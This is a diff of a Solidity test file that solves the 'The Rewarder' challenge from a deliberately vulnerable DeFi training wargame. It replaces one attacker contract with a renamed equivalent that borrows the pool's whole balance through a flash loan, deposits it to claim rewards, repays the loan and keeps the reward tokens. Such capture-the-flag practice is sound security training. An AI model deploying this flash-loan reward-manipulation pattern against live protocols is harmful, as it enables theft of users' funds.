@@ -12,62 +12,6 @@ import "../../src/DamnValuableToken.sol";
 
 import "openzeppelin-contracts/utils/Address.sol";
 
-contract Executor {
-    FlashLoanerPool flashLoanPool;
-    TheRewarderPool rewarderPool;
-    DamnValuableToken liquidityToken;
-    RewardToken rewardToken;
-
-    address owner;
-
-    constructor(
-        DamnValuableToken _liquidityToken,
-        FlashLoanerPool _flashLoanPool,
-        TheRewarderPool _rewarderPool,
-        RewardToken _rewardToken
-    ) {
-        owner = msg.sender;
-        liquidityToken = _liquidityToken;
-        flashLoanPool = _flashLoanPool;
-        rewarderPool = _rewarderPool;
-        rewardToken = _rewardToken;
-    }
-
-    function receiveFlashLoan(uint256 borrowAmount) external {
-        require(msg.sender == address(flashLoanPool), "only pool");
-
-        liquidityToken.approve(address(rewarderPool), borrowAmount);
-
-        // theorically depositing DVT call already distribute reward if the next round has already started
-        rewarderPool.deposit(borrowAmount);
-
-        // we can now withdraw everything
-        rewarderPool.withdraw(borrowAmount);
-
-        // we send back the borrowed tocken
-        bool payedBorrow = liquidityToken.transfer(
-            address(flashLoanPool),
-            borrowAmount
-        );
-        require(payedBorrow, "Borrow not payed back");
-
-        // we transfer the rewarded RewardToken to the contract's owner
-        uint256 rewardBalance = rewardToken.balanceOf(address(this));
-        bool rewardSent = rewardToken.transfer(owner, rewardBalance);
-
-        require(rewardSent, "Reward not sent back to the contract's owner");
-    }
-
-    function attack() external {
-        require(msg.sender == owner, "only owner");
-
-        uint256 dvtPoolBalance = liquidityToken.balanceOf(
-            address(flashLoanPool)
-        );
-        flashLoanPool.flashLoan(dvtPoolBalance);
-    }
-}
-
 contract TheRewarderTest is BaseTest {
     uint TOKENS_IN_LENDER_POOL = 1000000 ether;
 
@@ -156,19 +100,18 @@ contract TheRewarderTest is BaseTest {
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
-
         // Advance time 5 days so that depositors can get rewards
         utils.mineTime(5 days);
 
         // deploy the exploit contract
         vm.startPrank(attacker);
-        Executor executor = new Executor(
-            liquidityToken,
-            flashLoanPool,
-            rewarderPool,
-            rewardToken
+        Hack hack = new Hack(
+            address(liquidityToken),
+            address(flashLoanPool),
+            address(rewarderPool),
+            address(rewardToken)
         );
-        executor.attack();
+        hack.attack();
         vm.stopPrank();
     }
 
@@ -201,5 +144,59 @@ contract TheRewarderTest is BaseTest {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(liquidityToken.balanceOf(attacker), 0);
+    }
+}
+
+contract Hack {
+    address public liquidityTokenAddr;
+    address public flashLoanerPoolAddr;
+    address public rewarderPoolAddr;
+    address public rewardTokenAddr;
+
+    address public attacker;
+
+    constructor(
+        address _liquidityTokenAddr,
+        address _flashLoanerPoolAddr,
+        address _rewarderPoolAddr,
+        address _rewardTokenAddr
+    ) {
+        attacker = msg.sender;
+        liquidityTokenAddr = _liquidityTokenAddr;
+        flashLoanerPoolAddr = _flashLoanerPoolAddr;
+        rewarderPoolAddr = _rewarderPoolAddr;
+        rewardTokenAddr = _rewardTokenAddr;
+    }
+
+    function receiveFlashLoan(uint256 borrowAmount) external {
+        require(msg.sender == flashLoanerPoolAddr);
+
+        DamnValuableToken liquidityToken = DamnValuableToken(
+            liquidityTokenAddr
+        );
+        TheRewarderPool rewarderPool = TheRewarderPool(rewarderPoolAddr);
+        RewardToken rewardToken = RewardToken(rewardTokenAddr);
+
+        liquidityToken.approve(rewarderPoolAddr, borrowAmount);
+        rewarderPool.deposit(borrowAmount);
+        rewarderPool.withdraw(borrowAmount);
+
+        bool payedBorrow = liquidityToken.transfer(
+            flashLoanerPoolAddr,
+            borrowAmount
+        );
+        require(payedBorrow);
+
+        uint256 rewardBalance = rewardToken.balanceOf(address(this));
+        bool rewardSent = rewardToken.transfer(attacker, rewardBalance);
+        require(rewardSent);
+    }
+
+    function attack() public {
+        require(msg.sender == attacker);
+
+        uint256 dvtPoolBalance = DamnValuableToken(liquidityTokenAddr)
+            .balanceOf(flashLoanerPoolAddr);
+        FlashLoanerPool(flashLoanerPoolAddr).flashLoan(dvtPoolBalance);
     }
 }
